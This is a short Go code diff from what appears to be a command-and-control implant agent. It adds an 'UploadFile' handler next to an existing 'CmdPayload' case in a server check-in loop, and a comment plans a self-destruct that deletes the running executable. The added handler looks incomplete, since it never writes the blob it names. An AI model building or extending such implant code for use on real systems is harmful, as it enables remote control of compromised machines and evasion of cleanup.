@@ -258,6 +258,17 @@ func statusCheckIn(host string, client *http.Client) {
 			color.Green("%s Message Type Received!", j.Type)
 		}
 		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
+		case "UploadFile":
+			var p messages.UploadFile
+			json.Unmarshal(payload, &p)
+
+			if verbose {
+				color.Yellow("Writing blob to : %s", p.Dest)
+			}
+			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
+			if resp2.StatusCode != 200 {
+				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
+			}
 		case "CmdPayload":
 			var p messages.CmdPayload
 			json.Unmarshal(payload, &p)
